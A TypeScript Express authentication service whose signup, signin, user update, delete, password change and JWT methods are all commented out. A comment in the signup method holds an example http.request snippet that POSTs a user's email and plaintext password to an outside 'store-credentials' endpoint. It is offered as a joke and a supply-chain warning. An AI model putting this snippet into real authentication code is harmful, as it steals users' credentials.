import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '@/config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUser, IUserInputDTO } from '@/interfaces/IUser';
import { EventDispatcher, EventDispatcherInterface } from '@/decorators/eventDispatcher';
import events from '@/subscribers/events';
import { throttle } from 'lodash';
import { ObjectId } from 'mongoose';
import { Request, Response } from 'express';
import { ParamsDictionary } from 'express-serve-static-core';
import { ParsedQs } from 'qs';

@Service()
export default class AuthService {
  constructor(
    @Inject('userModel') private userModel: Models.UserModel,
    private mailer: MailerService,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {}

  // public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
  //   try {
  //     const salt = randomBytes(32);

  //     /**
  //      * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
  //      * require('http')
  //      *  .request({
  //      *     hostname: 'http://my-other-api.com/',
  //      *     path: '/store-credentials',
  //      *     port: 80,
  //      *     method: 'POST',
  //      * }, ()=>{}).write(JSON.stringify({ email, password })).end();
  //      *
  //      * Just kidding, don't do that!!!
  //      *
  //      * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
  //      * watches every API call and if it spots a 'password' and 'email' property then
  //      * it decides to steal them!? Would you even notice that? I wouldn't :/
  //      */
  //     this.logger.silly('Hashing password');
  //     var getuser = await this.userModel.find({
  //       email: userInputDTO.email
  //     })
  //     // console.log(getuser)
  //     if(getuser.length!=0){
  //       throw new Error('User already registered');
  //     }
  //     const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
  //     this.logger.silly('Creating user db record');
  //     const userRecord = await this.userModel.create({
  //       ...userInputDTO,
  //       salt: salt.toString('hex'),
  //       password: hashedPassword,
  //     });
  //     this.logger.silly('Generating JWT');
  //     const token = this.generateToken(userRecord);

  //     if (!userRecord) {
  //       throw new Error('User cannot be created');
  //     }
  //     // this.logger.silly('Sending welcome email');
  //     // await this.mailer.SendWelcomeEmail(userRecord);

  //     // this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });

  //     /**
  //      * @TODO This is not the best way to deal with this
  //      * There should exist a 'Mapper' layer
  //      * that transforms data from layer to layer
  //      * but that's too over-engineering for now
  //      */
  //     const user = userRecord.toObject();
  //     Reflect.deleteProperty(user, 'password');
  //     Reflect.deleteProperty(user, 'salt');
  //     return { user, token };
  //   } catch (e) {
  //     this.logger.error(e);
  //     throw e;
  //   }
  // }

  // public async SignIn(email: string, password: string): Promise<{ user: IUser; token: string }> {
  //   const userRecord = await this.userModel.findOne({ email });
  //   // console.log('1',userRecord);
    
  //   if (!userRecord) {
  //     throw new Error('User not registered');
  //   }
  //   /**
  //    * We use verify from argon2 to prevent 'timing based' attacks
  //    */
  //   this.logger.silly('Checking password');
  //   const validPassword = await argon2.verify(userRecord.password, password);
  //   // console.log('2',validPassword);
    
  //   if (validPassword) {
  //     this.logger.silly('Password is valid!');
  //     this.logger.silly('Generating JWT');
  //     const token = this.generateToken(userRecord);

  //     const user = userRecord.toObject();
  //     Reflect.deleteProperty(user, 'password');
  //     Reflect.deleteProperty(user, 'salt');
  //     /**
  //      * Easy as pie, you don't need passport.js anymore :)
  //      */
  //     // console.log('3',user);
      
  //     return { user, token };
  //   } else {
  //     throw new Error('Invalid Password');
  //   }
  // }

  // public async deleteUser(res:any,_id: any): Promise<{ user: IUser }> {
  //   try {
  //     console.log('1',_id);
  //     const userRecord1 = await this.userModel.findOne({ _id });
  //     console.log('2',userRecord1)
  //     if (!userRecord1) {
  //       throw new Error('user not found');
  //     }
      
  //     const userRecord = await this.userModel.findByIdAndDelete({ _id  });
  //       console.log('3',userRecord);
        
  //     if (!userRecord) {
  //       throw new Error('User not registered');
  //     }

  //     return res.status(200).send({ Message: 'user deleted successfully' });
  //   } catch (e) {
  //     // this.logger.error(e);
  //     throw e;
  //   }
  // }

  // public async updateUser(userUpdateDTO: IUser, userId: ObjectId): Promise<{ user: IUser }> {
  //   try {
  //     const userRecord1 = await this.userModel.findByIdAndUpdate(userId, {
  //       name: userUpdateDTO.name,
  //       mobile: userUpdateDTO.mobile,
  //       new: true,
  //     });

  //     const userRecord = await this.userModel.findOne({ _id: userId });
  //     if (!userRecord) {
  //       throw new Error('user not found');
  //     }
  //     const user = userRecord.toObject();

  //     return { user };
  //   } catch (e) {
  //     this.logger.error(e);
  //     throw e;
  //   }
  // }

  // public async changePassword(req: IUserInputDTO): Promise<{ user: IUser; message: string }> {
  //   try {
  //     let email = req.email;
  //     const userRecord1 = await this.userModel.findOne({ email });
  //     const salt = randomBytes(32);
  //     const hashedPassword = await argon2.hash(req.newPassword, { salt });
  //     if (userRecord1) {
  //       let newPassword = req.newPassword;
  //       let oldPassword = req.oldPassword;

  //       let validpass = await argon2.verify(userRecord1.password, oldPassword);
  //       if (!validpass) {
  //         throw new Error('old password does not match');
  //       }
  //       await this.userModel.findOne({ email: email }).update({ password: hashedPassword, salt: salt.toString('hex') });
  //       let userRecord = await this.userModel.findOne({ email });

  //       const user = userRecord.toObject();
  //       Reflect.deleteProperty(user, 'password');
  //       Reflect.deleteProperty(user, 'salt');
  //       return { user, message: 'password change successfully' };
  //     } else {
  //       throw new Error('User does not exist');
  //     }
  //   } catch (e) {
  //     this.logger.error(e);
  //     throw e;
  //   }
  // }

  // private generateToken(user) {
  //   const today = new Date();
  //   const exp = new Date(today);
  //   exp.setDate(today.getDate() + 60);

  //   /**
  //    * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
  //    * The cool thing is that you can add custom properties a.k.a metadata
  //    * Here we are adding the userId, role and name
  //    * Beware that the metadata is public and can be decoded without _the secret_
  //    * but the client cannot craft a JWT to fake a userId
  //    * because it doesn't have _the secret_ to sign it
  //    * more information here: https://softwareontheroad.com/you-dont-need-passport
  //    */
  //   this.logger.silly(`Sign JWT for userId: ${user._id}`);
  //   return jwt.sign(
  //     {
  //       _id: user._id, // We are gonna use this in the middleware 'isAuth'
  //       role: user.role,
  //       name: user.name,
  //       exp: exp.getTime() / 1000,
  //     },
  //     config.jwtSecret,
  //   );
  // }
}
